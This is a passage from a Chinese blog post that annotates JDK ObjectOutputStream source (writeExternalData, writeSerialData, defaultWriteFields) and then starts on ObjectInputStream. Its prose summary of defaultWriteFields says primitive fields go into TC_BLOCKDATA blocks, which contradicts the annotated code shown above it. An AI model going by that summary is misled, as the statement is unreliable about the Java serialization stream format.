writeExternal 中错误地调用 defaultWriteObject/putFields 等 API。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeExternalData</span><span class="params">(Externalizable obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 暂存并清空 PutFields 上下文：</span></span><br><span class="line">    <span class="comment">// - curPut 仅在“默认字段写出”路径（putFields / writeFields）中使用；</span></span><br><span class="line">    <span class="comment">// - Externalizable 不应与 putFields 混用，清空可防误用（否则应抛 NotActiveException）。</span></span><br><span class="line">    <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">    curPut = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// （可选）调试轨迹增强：记录“正在写外部化数据”</span></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(<span class="string">&quot;writeExternal data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 暂存并清空“序列化回调上下文”：</span></span><br><span class="line">    <span class="comment">// - curContext 用于 defaultWriteObject/writeObject 等回调期间的合法性校验；</span></span><br><span class="line">    <span class="comment">// - Externalizable 路径不允许 defaultWriteObject/writeFields，因此将其置空。</span></span><br><span class="line">    <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        curContext = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            <span class="comment">// v1 协议：不使用 Block-Data 包裹，直接由对象写出</span></span><br><span class="line">            obj.writeExternal(<span class="built_in">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// v2 协议（默认）：用 Block-Data 包裹外部化数据区</span></span><br><span class="line">            <span class="comment">// 注：在块模式下，原始类型写入会聚合为 TC_BLOCKDATA/TC_BLOCKDATALONG，</span></span><br><span class="line">            <span class="comment">//     若 writeExternal 内部调用 writeObject(...)，该方法会自行在需要处</span></span><br><span class="line">            <span class="comment">//     切到“非块模式”写结构化标记，再回到块模式，整体对齐由 OOS 保证。</span></span><br><span class="line">            bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">            obj.writeExternal(<span class="built_in">this</span>);</span><br><span class="line">            bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入注解块结束标记：TC_ENDBLOCKDATA（0x78）</span></span><br><span class="line">            <span class="comment">// 告知对端“外部化数据区”已结束，随后可继续读取后续结构（如父类描述、实例尾等）。</span></span><br><span class="line">            bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复调用前的上下文与调试栈</span></span><br><span class="line">        curContext = oldContext;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复 PutFields 上下文</span></span><br><span class="line">    curPut = oldPut;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>具体过程为：</p>
<ol>
<li>暂存并清空 <code>curPut</code> &#x2F; <code>curContext</code>（禁用默认序列化路径；误用将抛 <code>NotActiveException</code>）。</li>
<li><code>bout.setBlockDataMode(true)</code> 开启块数据模式。</li>
<li>回调 <strong><code>obj.writeExternal(this)</code><strong>：对象</strong>自行</strong>向流中写任何需要的内容（可写原始类型、对象等）。</li>
<li><code>bout.setBlockDataMode(false)</code> 退出块模式。</li>
<li>写 <code>TC_ENDBLOCKDATA</code> 作为“外部化数据段结束”标记。</li>
</ol>
<p>这里注意到 <code>writeExternalData</code> 有清空和恢复 <code>PutFields</code> 上下文的操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">curPut = <span class="literal">null</span>;               <span class="comment">// ←★ 清空 PutFields 上下文</span></span><br><span class="line">...</span><br><span class="line">obj.writeExternal(<span class="built_in">this</span>);     <span class="comment">// 用户自定义代码</span></span><br><span class="line">...</span><br><span class="line">curPut = oldPut;             <span class="comment">// ←★ 调用完再恢复</span></span><br></pre></td></tr></table></figure></div>

<p><code>curPut</code> 代表 <strong>“当前层 <code>defaultWriteObject</code>&#x2F;<code>putFields</code> 写字段的上下文”</strong>。它只在 <em>Serializable</em> 路径、并且<strong>正在执行某一层的 <code>writeObject</code> 回调时</strong>才会被设置为非 <code>null</code>——也就是 <strong><code>putFields()/writeFields()</code> 临时存放字段值</strong> 的缓冲器。</p>
<p>如果在进入 <code>writeExternalData()</code> 时不把<strong>已经存在的 <code>curPut</code> 清掉</strong>，可能发生<strong>嵌套调用污染</strong>，例如：</p>
<ul>
<li>当前正序列化一个对象 <code>Outer</code>，它的 <code>writeObject()</code> 里调用了 <code>putFields()</code>，此时 <code>curPut</code> 指向 <code>Outer</code> 的字段缓冲。</li>
<li><code>writeObject()</code> 又写了一个 <code>Externalizable</code> 的 <code>Inner</code>。</li>
<li>如果不清空，<code>Inner.writeExternal()</code> 内部一旦误用 <code>defaultWriteObject()</code> 或 <code>putFields()</code>，框架会把这块缓冲误认为还在写 <code>Outer</code>，导致<strong>字段错位或直接抛异常</strong>。</li>
</ul>
<p>所以，清空 <code>curPut</code> 是一种<strong>“断开默认字段通道 + 防污染 + 防误用”</strong> 的保护措施。</p>
<h3 id="writeSerialData"><a href="#writeSerialData" class="headerlink" title="writeSerialData"></a>writeSerialData</h3><p>当对象既不是 <code>Externalizable</code>、也不是 <code>String/数组/Enum/Class/ObjectStreamClass</code> 这些特例时，<code>writeOrdinaryObject(...)</code> 会通过 <code>writeSerialData</code> 写字段数据。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 依“类层级从父到子”的顺序，为给定对象写出每一层可序列化类（Serializable 部分）的</span></span><br><span class="line"><span class="comment"> * **实例数据区**。每一层要么走自定义 `writeObject`，要么走默认字段写出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议要点（读取端将据此对称解析）：</span></span><br><span class="line"><span class="comment"> * - 对于声明了 `private void writeObject(ObjectOutputStream)` 的类：</span></span><br><span class="line"><span class="comment"> *     * 该层实例数据以 **Block-Data** 方式写出（进入块数据模式）；</span></span><br><span class="line"><span class="comment"> *     * 写完后切回非块模式，并写入 `TC_ENDBLOCKDATA (0x78)` 作为该层数据结束标记；</span></span><br><span class="line"><span class="comment"> *     * 读取端会调用 `readObject(ObjectInputStream)` 并按块读取，直到遇到 `TC_ENDBLOCKDATA`。</span></span><br><span class="line"><span class="comment"> * - 对于未声明 `writeObject` 的类：</span></span><br><span class="line"><span class="comment"> *     * 使用“默认字段写出”（defaultWriteFields）：顺序写该层的非 transient/非 static 字段；</span></span><br><span class="line"><span class="comment"> *     * 原始类型直接写，引用类型以对象方式写（可递归/可共享）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 顺序与一致性：</span></span><br><span class="line"><span class="comment"> * - `getClassDataLayout()` 返回的插槽（ClassDataSlot）顺序为：**超类 → 子类**；</span></span><br><span class="line"><span class="comment"> *   因此父类字段/自定义数据会先写，子类随后写，保证层级一致性。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 取得“类数据布局”插槽列表：每个插槽对应层级中的一个可序列化类</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line">            <span class="comment">// 分支 A：该层声明了自定义 writeObject(...)</span></span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存并清空 PutFields 上下文：</span></span><br><span class="line">            <span class="comment">// - `curPut` 仅在 writeObject 中配合 putFields()/writeFields() 使用；</span></span><br><span class="line">            <span class="comment">// - 先置空，避免将上一层/外层的状态“串味”到本层。</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存并暂时替换“序列化回调上下文”：</span></span><br><span class="line">            <span class="comment">// - `curContext` 用来校验 defaultWriteObject/putFields 等只能在</span></span><br><span class="line">            <span class="comment">//   当前对象&amp;当前类范围内调用（否则抛 NotActiveException）。</span></span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// （可选）调试：标记正在写自定义数据，便于异常路径栈展示</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 为本层建立新的“回调上下文”</span></span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 进入块数据模式：自定义 writeObject 写出的原始数据将被封装为 TC_BLOCKDATA*</span></span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射调用该类私有的 writeObject(ObjectOutputStream) 实现</span></span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 写完后切回非块模式，以便书写结构化的结束标记</span></span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 写入本层自定义数据的结束标记：TC_ENDBLOCKDATA (0x78)</span></span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 标记当前回调上下文已使用完毕，防止被重复滥用</span></span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                <span class="comment">// 恢复外层回调上下文</span></span><br><span class="line">                curContext = oldContext;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 恢复外层 PutFields 上下文</span></span><br><span class="line">            curPut = oldPut;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line">            <span class="comment">// 分支 B：无自定义 writeObject → 走默认字段写出</span></span><br><span class="line">            <span class="comment">// ─────────────────────────────────────────────────────────────</span></span><br><span class="line">            <span class="comment">// 默认规则：</span></span><br><span class="line">            <span class="comment">// - 仅写该层声明的“可持久化字段”（非 transient / 非 static）；</span></span><br><span class="line">            <span class="comment">// - 原始类型直接写入；对象/数组字段按对象方式写入（可能触发递归）；</span></span><br><span class="line">            <span class="comment">// - 字段顺序由 ObjectStreamClass 预先规范化（与读取端一致）。</span></span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>desc.getClassDataLayout()</code> 会给出<strong>可序列化链</strong>的每一层（<code>ClassDataSlot</code>），顺序始终是 <strong>父类在前、子类在后</strong>。对每一层 <code>slotDesc</code> 有两条路径：</p>
<ul>
<li>该层<strong>声明了</strong> <code>private void writeObject(ObjectOutputStream out)</code>（自定义路径）</li>
</ul>
<ol>
<li><p><strong>隔离上下文</strong></p>
<ul>
<li>暂存并清空 <code>curPut</code>（避免把外层&#x2F;上一层的 putFields 状态“串味”到本层；误用会抛 <code>NotActiveException</code>）。</li>
<li>暂存并替换 <code>curContext = new SerialCallbackContext(obj, slotDesc)</code>（确保 <code>defaultWriteObject/putFields</code> 只能在“当前对象+当前层”里被合法调用）。</li>
</ul>
</li>
<li><p><strong>用块数据包裹该层“自定义数据区”</strong></p>
<ul>
<li><p><code>bout.setBlockDataMode(true)</code> 开启 Data Block 模式</p>
</li>
<li><p>反射调用 <code>slotDesc.invokeWriteObject(obj, this)</code></p>
</li>
<li><p><code>bout.setBlockDataMode(false)</code> 关闭 Data Block 模式</p>
</li>
<li><p><strong>写入该层结尾标记</strong>：<code>TC_ENDBLOCKDATA (0x78)</code></p>
</li>
</ul>
</li>
<li><p><strong>恢复上下文</strong></p>
<ul>
<li><code>curContext.setUsed(); curContext = oldContext; curPut = oldPut;</code></li>
<li>若开了 <code>extendedDebugInfo</code>，弹出调试栈条目。</li>
</ul>
</li>
</ol>
<ul>
<li>该层<strong>没有</strong> <code>writeObject(...)</code>（默认字段路径）</li>
</ul>
<p>  这时调用 <code>defaultWriteFields(obj, slotDesc)</code>。</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把“给定对象 obj 在某一层（desc 指定的类）”的**可序列化字段值**写到流里。</span></span><br><span class="line"><span class="comment"> * 哪些字段、以什么顺序写，由 ObjectStreamClass desc 事先规范好（见 getFields(...)）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 关键点：</span></span><br><span class="line"><span class="comment"> * 1) 这是“默认字段写出”（defaultWriteFields）路径：仅在该层**没有**自定义</span></span><br><span class="line"><span class="comment"> *    writeObject(ObjectOutputStream) 时调用；否则由 writeObject 内部决定如何写。</span></span><br><span class="line"><span class="comment"> * 2) 原始类型字段（primitive）与对象/数组字段分开处理：</span></span><br><span class="line"><span class="comment"> *    - 原始字段：收集到一个字节缓冲 primVals 后，**按非块模式**直接顺序写出（DataOutput 语义）。</span></span><br><span class="line"><span class="comment"> *      注意：这里**不会**写 TC_ENDBLOCKDATA；也不会自动加 TC_BLOCKDATA 头。</span></span><br><span class="line"><span class="comment"> *    - 对象/数组字段：逐个调用 writeObject0(...)（或 writeUnshared 语义，取决于字段的 isUnshared）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// -------- 0) 运行时类型安全检查：obj 必须是 desc.forClass() 的实例 ----------</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();  <span class="comment">// 防御式：类型不匹配直接失败</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- 1) 校验该层是否允许“默认序列化” ----------</span></span><br><span class="line">    <span class="comment">// 若在 OSC 初始化阶段已发现默认序列化不合法（如字段布局问题等），</span></span><br><span class="line">    <span class="comment">// 这里会抛 InvalidClassException（通过内部缓存的 defaultSerializeEx）。</span></span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- 2) 写原始类型字段（primitive block *字节*，非“块数据模式”的 block） ----------</span></span><br><span class="line">    <span class="comment">// 2.1 预分配/复用承载原始字段字节的缓冲 primVals（大小 = 该层所有 primitive 字段总字节数）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.2 通过反射把 obj 在该层的 primitive 字段值打包进 primVals（按 desc 既定顺序/布局）</span></span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">// 2.3 一次性写出这段字节</span></span><br><span class="line">    <span class="comment">//     注意：此时 OOS 仍处于“非块模式”，所以这里是**原样写字节**，不带 TC_BLOCKDATA/TC_BLOCKDATALONG 头；</span></span><br><span class="line">    <span class="comment">//     第四个参数 false 表示“不复制调用方缓冲”，由实现决定是否直接使用该数组（性能优化）。</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------- 3) 写对象/数组字段（逐个调用 writeObject0 / writeUnshared） ----------</span></span><br><span class="line">    <span class="comment">// 3.1 fields 含“该层所有可持久化字段”，顺序已由 OSC 规范化：**先 primitive，再 object/array**</span></span><br><span class="line">    <span class="comment">//     这里 getFields(false) 的 false 表示“返回内部数组引用，不拷贝”，减少分配。</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.2 为对象字段准备承载值的数组（大小 = 对象/数组字段个数）</span></span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.3 primitive 字段数量 = 全字段数 - 对象字段数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.4 通过反射把“对象/数组字段”的当前值取到 objVals（顺序与 fields 的“对象段”一致）</span></span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.5 逐个写出对象/数组字段</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            <span class="comment">// 调试栈：标注当前正在写的字段（类名/字段名/字段类型），异常时可定位</span></span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                <span class="string">&quot;field (class \&quot;&quot;</span> + desc.getName() + <span class="string">&quot;\&quot;, name: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getName() + <span class="string">&quot;\&quot;, type: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getType() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// isUnshared() 仅对“对象/数组字段”有意义（来自 serialPersistentFields 也可指定 unshared）：</span></span><br><span class="line">            <span class="comment">// - true  → 按“非共享”语义写（writeUnshared）：不会登记句柄，后续也不会 TC_REFERENCE 回指到该值</span></span><br><span class="line">            <span class="comment">// - false → 常规共享语义：首次登记句柄，后续可 TC_REFERENCE 引用同一实例</span></span><br><span class="line">            writeObject0(</span><br><span class="line">                objVals[i],</span><br><span class="line">                fields[numPrimFields + i].isUnshared()</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>  它会<strong>严格按该层的字段布局</strong>写值：</p>
<ol>
<li><p><strong>原始字段（primitive）统一打包</strong></p>
<ul>
<li>内部会开启块模式，把该层<strong>所有原始类型字段</strong>的字节连续写入一个（或若干）<code>TC_BLOCKDATA/TC_BLOCKDATALONG</code> 块；</li>
<li>写完立刻切回非块模式（只是为了把“原始字段段”打包），**不会写 <code>TC_ENDBLOCKDATA</code>**。</li>
</ul>
</li>
<li><p><strong>对象&#x2F;数组字段逐个写</strong></p>
<ul>
<li>依序对每个对象&#x2F;数组字段调用 <code>writeObject(...)</code>（或 <code>writeUnshared(...)</code>，若该字段在 <code>serialPersistentFields</code> 里声明了 <code>unshared</code>）；</li>
<li>这些写法会走“结构化标记”：<code>TC_NULL/TC_REFERENCE/TC_OBJECT/...</code> 等。</li>
</ul>
</li>
</ol>
<h1 id="反序列化过程分析"><a href="#反序列化过程分析" class="headerlink" title="反序列化过程分析"></a>反序列化过程分析</h1><p>通常我们通过下面这个过程将对象反序列化：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">object = objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div>

<h2 id="ObjectInputStream-对象"><a href="#ObjectInputStream-对象" class="headerlink" title="ObjectInputStream 对象"></a>ObjectInputStream 对象</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectInputStream 用于反序列化先前由 ObjectOutputStream 写入的</span></span><br><span class="line"><span 